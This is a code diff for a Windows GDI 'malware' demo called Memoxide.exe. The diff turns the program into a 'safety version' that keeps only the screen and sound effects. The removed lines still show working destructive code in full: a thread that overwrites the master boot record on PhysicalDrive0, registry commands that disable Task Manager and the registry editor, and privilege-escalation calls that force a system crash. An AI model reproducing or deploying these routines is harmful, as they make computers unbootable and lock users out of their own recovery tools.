@@ -4,27 +4,6 @@
 #pragma comment (lib, "winmm.lib")
 //#pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "kernel32.lib")
-#include "MBR.h"
-//EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
-//EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
-typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
-typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
-DWORD WINAPI mbr(LPVOID lpParam) {
-		DWORD dwBytesWritten;
-		HANDLE hDevice = CreateFileW(
-			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
-			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
-			OPEN_EXISTING, 0, 0);
-
-		WriteFile(hDevice, MasterBootRecord, 66560, &dwBytesWritten, 0);
-		return 0;
-}
-
-DWORD WINAPI Disable(LPVOID lpParam) {
-	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
-	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
-	return 0;
-}
 
 DWORD WINAPI RanTunnel(LPVOID lpParam) {
 	HDC hdc = GetDC(0);
@@ -444,22 +423,20 @@ VOID WINAPI sound11()
 }
 
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
-	if (MessageBoxW(NULL, L"Warning! This software is malware.\r\n\
-Are you sure you want to run it?", L"Memoxide.exe", MB_YESNO | MB_ICONEXCLAMATION | MB_SYSTEMMODAL) == IDNO)
+	if (MessageBoxW(NULL, L"Warning! This software is GDI Only.\r\n\
+Are you sure you want to run it?", L"Memoxide.exe (safety version)", MB_YESNO | MB_ICONEXCLAMATION | MB_SYSTEMMODAL) == IDNO)
 	{
 		ExitProcess(0);
 	}
 	else
 	{
-		if (MessageBoxW(NULL, L"it will overwrite the MBR and make the computer unbootable!\r\n\
+		if (MessageBoxW(NULL, L"it will not overwrite the MBR or make the computer unbootable!\r\n\
 still want to run it?", L"LAST WARNING!!!", MB_YESNO | MB_ICONEXCLAMATION | MB_SYSTEMMODAL) == IDNO)
 		{
 			ExitProcess(0);
 		}
 		else
 		{
-			HANDLE Overwrite = CreateThread(0, 0, mbr, 0, 0, 0);
-			HANDLE D = CreateThread(0, 0, Disable, 0, 0, 0);
 			Sleep(5000);
 			HANDLE P1 = CreateThread(0, 0, RanTunnel, 0, 0, 0);
 			sound1();
@@ -549,13 +526,6 @@ still want to run it?", L"LAST WARNING!!!", MB_YESNO | MB_ICONEXCLAMATION | MB_S
 			TerminateThread(P11, 0);
 			CloseHandle(P11);
 			InvalidateRect(0, 0, 0);
-			BOOLEAN b;
-			DWORD response;
-			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
-			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
-			RtlAdjustPrivilege(19, true, false, &b);
-			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
-			Sleep(-1);
 		}
 	}
 }
